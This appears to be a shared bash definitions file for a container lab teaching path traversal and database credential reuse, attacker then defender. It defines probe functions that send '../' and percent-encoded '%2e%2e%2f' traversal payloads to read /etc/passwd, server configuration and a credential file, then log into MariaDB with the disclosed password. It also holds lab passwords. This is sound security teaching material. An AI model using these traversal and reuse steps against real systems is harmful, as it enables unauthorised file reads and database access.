#!/usr/bin/env bash
# Shared definitions for the path traversal and credential reuse lab.
# Sourced by spawn/status/shell/reset/teardown/selftest. No side effects.
#
# This is the single source of truth for the lab's AS number, subnet, container
# names, IPs, interface names, account names, passwords and file paths. Every
# other script sources it; never hardcode any of these in a second place.
#
# The lab is played attacker then defender. A document viewer joins the value of
# a query parameter to a directory name and opens the result, so a value holding
# `../` names a file outside that directory. Part 1 walks the chain that turns
# one file read into a database session:
#
#   1A  read a document the portal is meant to serve, so the mapping from the
#       query parameter to a path on disk is established before it is abused
#   1B  climb out of the document directory to /etc/passwd, which proves the
#       class of bug and nothing more
#   1C  read the web server's configuration, which names the document root
#   1D  read the viewer's own source out of that document root, which names the
#       file its database credentials come from
#   1E  read that file: the portal's database account and its password
#   1F  open a database session from the ATTACKER's machine with them, and read
#       a table no request to the portal ever touches
#
# Every step's target is named by the step before it. Only 1B is guessed, and
# only because /etc/passwd is where a file-read bug is confirmed.
#
# Part 2 is four changes to configuration and no change to the viewer. Each one
# closes something different, and the order they are applied in is the lesson:
#
#   2A  the web server rejects a request whose query string holds `../`. It
#       stops the requests Part 1 sent and stops nothing else: PHP decodes
#       percent escapes in a query parameter after the server has matched the
#       raw query string, so the same read succeeds spelled %2e%2e%2f.
#   2B  open_basedir names the directories PHP may open at all. It is checked on
#       the resolved path, so no spelling of the traversal gets past it, and
#       /etc/passwd and the server's own configuration stop being readable. The
#       credential file does not: the viewer includes it, so it has to stay on
#       the list.
#   2C  the disclosed account is bound to the web tier's address. The attacker's
#       session is refused and the portal keeps working -- and the nightly
#       report job on the reports host stops, because it was using the same
#       account from a different address.
#   2D  one account per tier, each with its own password and each bound to its
#       own tier's address. All three facts hold at once.
#
# The traversal still discloses a working password after 2D, and that is the
# point rather than an oversight: what changed is that the password names an
# account the database accepts from one address, and the attacker is not at it.
# selftest.sh asserts every one of those negatives, so a lab where 2A secretly
# stopped the disclosure, or where 2B closed the credential file, or where 2C
# left the report job running, would fail there rather than quietly making a
# later stage pointless.

AS=123
DC=LAB

# ---------------------------------------------------------------------------
# One segment, one switch, four hosts. There is no router: every control in this
# lab is applied on a host rather than on a boundary device, and the database
# sees the address of whichever host opened the connection either way, which is
# what lets an account name the tier it belongs to.
SUBNET="123.0.0.0/24"
PREFIXLEN=24

WEB_IP="123.0.0.10"           # the portal; the viewer runs here and the traversal reads here
DB_IP="123.0.0.20"            # MariaDB; stages 2C and 2D are worked here
REPORTS_IP="123.0.0.30"       # the nightly report job; the second tier on the shared account
ATTACKER_IP="123.0.0.66"      # the machine every request is sent from

# ---------------------------------------------------------------------------
# The portal.
#
# The viewer is public on purpose: serving a customer a delivery note is what
# the portal is for, so nothing in this lab turns on the page having been
# exposed by mistake.
HTTP_PORT=80
VIEW_PATH="/view.php"
VIEW_URL="http://${WEB_IP}:${HTTP_PORT}${VIEW_PATH}"
SITE_URL="http://${WEB_IP}:${HTTP_PORT}/"

WEBROOT="/var/www/html"
VIEW_FILE="${WEBROOT}/view.php"
VIEW_PRISTINE="/usr/local/lib/minilabs/view.php"
SCHEMA_PRISTINE="/usr/local/lib/minilabs/schema.sql"
PHPINI_PRISTINE="/usr/local/lib/minilabs/php.ini"
DOCS_PRISTINE="/usr/local/lib/minilabs/docs"

# The document directory the viewer joins the query parameter to. It sits
# outside the document root, so the only way to read anything in it is through
# the viewer -- and, once the join is abused, the only way to read anything
# outside it is through the viewer as well.
DOC_DIR="/srv/docs"
DOC_A="returns-policy.txt"          # the document every liveness check fetches
DOC_A_TITLE="Returns and claims policy"
DOC_COUNT=3                         # documents in DOC_DIR and rows in `document`

# The database credentials the viewer includes. They sit outside the document
# root, which is correct practice and is why no request FETCHES this file; the
# traversal READS it, which is a different thing and is the lab's point.
DB_INC="/etc/minilabs/db.inc.php"
LIGHTTPD_CONF="/etc/lighttpd/portal.conf"
LIGHTTPD_PID="/run/lighttpd.pid"
PHP_CGI="/usr/bin/php-cgi82"
PHP_INI="/etc/php82/php.ini"

# The number of `../` segments that reach the filesystem root from DOC_DIR.
# /srv/docs/ + ../../ is /. An extra one is harmless, because /.. is / .
TRAVERSAL_DEPTH=2

# ---------------------------------------------------------------------------
# The reports tier. One command, run by hand here, standing in for the job a
# scheduler would run overnight. It is what makes stage 2C's wrong answer
# visible: an account bound to the web tier is an account this host cannot use.
REPORT_CMD="/usr/local/bin/nightly-report"
REPORT_CNF="/etc/minilabs/report.cnf"
CUSTOMER_ROWS=6
SHIPMENT_ROWS=9

# ---------------------------------------------------------------------------
# The database.
DB_NAME="portal"
DB_PORT=3306
MY_CNF_D="/etc/my.cnf.d/zz-lab.cnf"

# The one account the starter state gives both tiers. Its name and password are
# in a file on the web host and in a file on the reports host, and it is granted
# from '%', meaning any address. Stage 2C narrows that host part and stage 2D
# splits the account in two.
APP_USER="portalapp"
APP_PASS="Br1ndle-portal-2019"
APP_HOST_ANY="%"

# What stage 2D's reference solution creates. The learner picks their own
# passwords; nothing reads these two except solution/ and selftest.sh, and the
# oracle reads whatever password the web host's credential file actually holds
# rather than assuming either of them.
WEB_USER="portalweb"
WEB_PASS="w3b-KQ4tz-2026"
REPORT_USER="portalreports"
REPORT_PASS="rep-9Vhx-2026"

# ---------------------------------------------------------------------------
# Interface names. Host-side NICs follow the platform's <AS>-<segment>
# convention; the switch-side port is named after the host it faces.
LAN_IF="${AS}-lan"

SW="S1"
SW_CTN="${AS}_L7_${DC}_${SW}"
BR="br0"
sw_port_of() { echo "${AS}-$1"; }        # 123-web, 123-db, 123-reports, 123-attacker

# ---------------------------------------------------------------------------
# Container names: <AS>_L7_<DC>_<name>.
WEB_CTN="${AS}_L7_${DC}_web"
DB_CTN="${AS}_L7_${DC}_db"
REPORTS_CTN="${AS}_L7_${DC}_reports"
ATTACKER_CTN="${AS}_L7_${DC}_attacker"

HOSTS=(web db reports attacker)

# Every device that gets a starter config, in apply order. The database is
# first: the web server's own start-up check connects to it, and the report job
# is verified as part of its own configuration, so both need a database already
# accepting connections.
DEVICES=(db web reports attacker)

ctn_of() { echo "${AS}_L7_${DC}_$1"; }

ip_of() {   # <role> -> its address
    case "$1" in
        web)      echo "$WEB_IP" ;;
        db)       echo "$DB_IP" ;;
        reports)  echo "$REPORTS_IP" ;;
        attacker) echo "$ATTACKER_IP" ;;
        *)        echo "" ;;
    esac
}

# Lab root (parent of scripts/), resolved regardless of the caller's CWD.
LAB_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )/.." >/dev/null 2>&1 && pwd )"

HOST_IMAGE="d_host_traversal"
SWITCH_IMAGE="miniinterneteth/d_switch"

# Open vSwitch is started by hand rather than by the image's supervisord
# entrypoint, which runs ovs-ctl with its default --mlockall. In a user
# namespace CAP_IPC_LOCK cannot exceed RLIMIT_MEMLOCK, so thread stacks fail to
# lock and ovs-vswitchd dies with "pthread_create failed". --no-mlockall is what
# makes this lab boot on a rootless daemon.
SWITCH_CMD='/usr/share/openvswitch/scripts/ovs-ctl start --no-mlockall --system-id=random && exec sleep infinity'

# net.ipv4.ping_group_range is pinned to "0 0" on every container. A rootless
# daemon rejects "0 2147483647" because the gid is outside the user namespace's
# map, and the two daemons ship different defaults, so pinning it is what makes
# ping print the same thing on both.
PING_SYSCTL=(--sysctl "net.ipv4.ping_group_range=0 0")

# ---------------------------------------------------------------------------
# True when anything in <dir> is newer than the image built from it. An image is
# otherwise only rebuilt when it is missing, which means an edit to
# image/view.php or image/schema.sql never reaches a machine that built the
# image once -- and in this lab an unrebuilt image means the learner attacks a
# different program, or a different set of rows, from the one the handout
# quotes.
image_older_than_source() {   # <image> <dir>
    local img="$1" dir="$2" built newest
    built="$( docker image inspect -f '{{.Created}}' "$img" 2>/dev/null )" || return 1
    built="$( date -d "$built" +%s 2>/dev/null )" || return 1   # non-GNU date: skip the check
    newest="$( find "$dir" -type f -printf '%T@\n' 2>/dev/null | sort -n | tail -1 )"
    [ -n "$newest" ] || return 1
    [ "${newest%.*}" -gt "$built" ]
}

ensure_images() {
    if ! docker image inspect "$HOST_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] building $HOST_IMAGE from $LAB_DIR/image (first run only)"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to build $HOST_IMAGE" >&2; return 1; }
    elif image_older_than_source "$HOST_IMAGE" "$LAB_DIR/image"; then
        echo "[spawn] rebuilding $HOST_IMAGE: $LAB_DIR/image changed since it was built"
        docker build -t "$HOST_IMAGE" "$LAB_DIR/image" \
            || { echo "failed to rebuild $HOST_IMAGE" >&2; return 1; }
    fi
    if ! docker image inspect "$SWITCH_IMAGE" >/dev/null 2>&1; then
        echo "[spawn] pulling $SWITCH_IMAGE (first run only)"
        docker pull "$SWITCH_IMAGE" >/dev/null \
            || { echo "failed to pull $SWITCH_IMAGE" >&2; return 1; }
    fi
}

# ---------------------------------------------------------------------------
# Privileged host networking, performed from a helper container, so the learner
# needs docker access and nothing else. Both ends of every veth pair are moved
# into lab containers, so the namespace the pair is created in never matters,
# which is why the helper runs --network=none rather than --network=host.
HELPER_CTN="$( ctn_of netadmin_helper )"

helper_start() {
    docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true
    docker run -d --rm --name "$HELPER_CTN" \
        --privileged --network=none --pid=host \
        "$HOST_IMAGE" sleep 600 >/dev/null
    for _ in $(seq 1 40); do
        if docker exec "$HELPER_CTN" true >/dev/null 2>&1; then
            return 0
        fi
        sleep 0.25
    done
    echo "helper container $HELPER_CTN did not become ready" >&2
    return 1
}

helper() { docker exec "$HELPER_CTN" "$@"; }
helper_stop() { docker rm -f "$HELPER_CTN" >/dev/null 2>&1 || true; }

# ---------------------------------------------------------------------------
# Shared read-only probes. status.sh and selftest.sh both use these, so the two
# cannot disagree about the lab's success condition.

running() { docker ps --format '{{.Names}}' | grep -qx "$1"; }

# --- calling the viewer ----------------------------------------------------

# The `file` value is written into the URL exactly as the learner types it,
# because both spellings of the traversal have to survive the trip: curl's
# --data-urlencode would percent-encode the literal `../` as well, which would
# make the two requests indistinguishable at the web server and destroy stage
# 2A's whole lesson. `.` and `/` are legal in a query string, so nothing needs
# escaping for the literal spelling. -m bounds the wait so a request that
# cannot be answered returns rather than hanging until curl's default timeout.
CURL_TIMEOUT=10

view_from() {   # <role> <the file parameter's value, already spelled as it should be sent>
    docker exec "$( ctn_of "$1" )" \
        curl -s -m "$CURL_TIMEOUT" "${VIEW_URL}?file=$2" 2>/dev/null
}

view_status_from() {   # <role> <the file parameter's value> -> the HTTP status code
    docker exec "$( ctn_of "$1" )" \
        curl -s -o /dev/null -m "$CURL_TIMEOUT" -w '%{http_code}' \
        "${VIEW_URL}?file=$2" 2>/dev/null
}

# The two spellings of the same read. `../` is what a learner writes first;
# %2e%2e%2f is the same three characters percent-encoded, which PHP decodes back
# before the viewer sees them. Only the traversal segments are encoded, because
# only they have to get past a rule matching `../` in the raw query string; the
# rest of the path holds no `../` and needs no escaping.
literal_traversal()  { printf '../../%s' "$1"; }
encoded_traversal()  { printf '%%2e%%2e%%2f%%2e%%2e%%2f%s' "$1"; }

# --- what the traversal can reach ------------------------------------------

# Each of these returns `read` or `blocked`. A blocked read and a file that is
# not there look the same from outside, which is a property of the viewer
# (it suppresses the warning) and not of any defence.
reads_file() {   # <the file parameter's value> <a string the file certainly contains>
    if view_from attacker "$1" | grep -qF "$2"; then echo read; else echo blocked; fi
}

PASSWD_MARKER="root:x:0:0:"
passwd_literal()  { reads_file "$( literal_traversal etc/passwd )" "$PASSWD_MARKER"; }
passwd_encoded()  { reads_file "$( encoded_traversal etc/passwd )" "$PASSWD_MARKER"; }

# The server's configuration names the document root, which is how Part 1 finds
# out where the viewer's source lives.
lighttpd_conf_readable() {
    reads_file "$( encoded_traversal "${LIGHTTPD_CONF#/}" )" "server.document-root"
}

# The viewer's own source, read rather than run. It names the credential file.
view_source_readable() {
    reads_file "$( encoded_traversal "${VIEW_FILE#/}" )" "require '${DB_INC}'"
}

# The credential file. This is the one target that survives stage 2B, because
# the viewer includes it and open_basedir has to allow what the program needs.
db_inc_readable() {
    reads_file "$( encoded_traversal "${DB_INC#/}" )" "DB_PASS"
}

# --- the credential the traversal actually hands over ----------------------

# Read the account name and password out of whatever the web host's credential
# file holds RIGHT NOW, through the traversal, from the attacker's machine. The
# oracle therefore tests the credential a learner's own configuration exposes
# rather than one pinned here: after stage 2D the file holds a different account
# and a password the learner chose, and the check still measures the right
# thing.
disclosed_credential() {   # -> "<user> <password>", or empty when nothing was disclosed
    local body user pass
    body="$( view_from attacker "$( encoded_traversal "${DB_INC#/}" )" )"
    user="$( printf '%s' "$body" | sed -n 's/.*define("DB_USER", *"\([^"]*\)").*/\1/p' | head -1 )"
    pass="$( printf '%s' "$body" | sed -n 's/.*define("DB_PASS", *"\([^"]*\)").*/\1/p' | head -1 )"
    [ -n "$user" ] && [ -n "$pass" ] && printf '%s %s' "$user" "$pass"
}

# The end of Part 1: the disclosed credential, used from the attacker's machine
# to read a table no request to the portal ever touches. --connect-timeout
# bounds the wait so a database that is not there returns rather than sitting
# through the TCP retransmission schedule.
DIRECT_TIMEOUT=5
login_as() {   # <user> <password> -> yes | no
    if docker exec "$ATTACKER_CTN" mariadb \
            -h "$DB_IP" -P "$DB_PORT" --connect-timeout="$DIRECT_TIMEOUT" \
            -u "$1" "-p$2" -N \
            -e "SELECT COUNT(*) FROM ${DB_NAME}.customer" 2>/dev/null \
            | grep -qx "$CUSTOMER_ROWS"
    then echo yes; else echo no; fi
}

# -> accepted | refused | none.  `none` means the traversal disclosed no
# credential at all, which is a different failure from one that was refused.
credential_reuse() {
    local cred
    cred="$( disclosed_credential )" || true
    [ -n "$cred" ] || { echo none; return; }
    # shellcheck disable=SC2086
    set -- $cred
    if [ "$( login_as "$1" "$2" )" = yes ]; then echo accepted; else echo refused; fi
}

# The error the database prints when it has an account of that name but not one
# reachable from this address. Quoted in the handout, so selftest emits it.
reuse_error() {
    local cred
    cred="$( disclosed_credential )" || true
    [ -n "$cred" ] || { echo ""; return; }
    # shellcheck disable=SC2086
    set -- $cred
    docker exec "$ATTACKER_CTN" mariadb \
        -h "$DB_IP" -P "$DB_PORT" --connect-timeout="$DIRECT_TIMEOUT" \
        -u "$1" "-p$2" -e "SELECT 1" 2>&1 | tr -d '\r' | head -1
}

# --- the two liveness checks -----------------------------------------------

# The portal serving a document it is meant to serve. Every defence stage is
# paired with this, so a "defence" that worked by taking the viewer or the
# database away fails here instead of passing. The title comes from the database
# and the body from the document directory, so one request tests both.
page_serves() {   # -> ok | broken
    local body
    body="$( view_from attacker "$DOC_A" )"
    if printf '%s' "$body" | grep -qF "== ${DOC_A_TITLE} ==" \
       && printf '%s' "$body" | grep -qF "Brindle Logistics"
    then echo ok; else echo broken; fi
}

# The nightly report job on the reports host. This is the check stage 2C fails
# and stage 2D restores, and it is the whole reason the reports tier exists.
report_job() {   # -> ok | broken
    if docker exec "$REPORTS_CTN" "$REPORT_CMD" 2>/dev/null \
            | grep -qF "${CUSTOMER_ROWS} customers, ${SHIPMENT_ROWS} shipments"
    then echo ok; else echo broken; fi
}

# --- reading the configuration back off the machines -----------------------

# Whether the web server is loading mod_access and matching the query string,
# which is what stage 2A adds. Read from the file the server was started with
# rather than inferred from a request, so status.sh can report the rule
# separately from whether it works.
request_filter_present() {   # -> yes | no
    if docker exec "$WEB_CTN" grep -q 'HTTP\["querystring"\]' "$LIGHTTPD_CONF" 2>/dev/null
    then echo yes; else echo no; fi
}

open_basedir_value() {
    docker exec "$WEB_CTN" sh -c \
        "grep -E '^[[:space:]]*open_basedir[[:space:]]*=' '$PHP_INI' 2>/dev/null | tail -1" \
        | sed 's/^[[:space:]]*open_basedir[[:space:]]*=[[:space:]]*//' | tr -d '\r'
}

# Every account the database holds for this lab's application tiers, as
# `user@host` lines, read from the server rather than from whatever the learner
# believes they typed. Stages 2C and 2D are exactly these lines changing.
app_accounts() {
    docker exec "$DB_CTN" mariadb -u root -N -B \
        -e "SELECT CONCAT(User,'@',Host) FROM mysql.user
            WHERE User NOT IN ('root','mysql','PUBLIC') ORDER BY User, Host" 2>/dev/null \
        | tr -d '\r'
}

db_running() {
    docker exec "$DB_CTN" sh -c 'mariadb -u root -e "SELECT 1" >/dev/null 2>&1'
}

lighttpd_running() {
    docker exec "$WEB_CTN" sh -c 'pgrep -x lighttpd >/dev/null 2>&1'
}
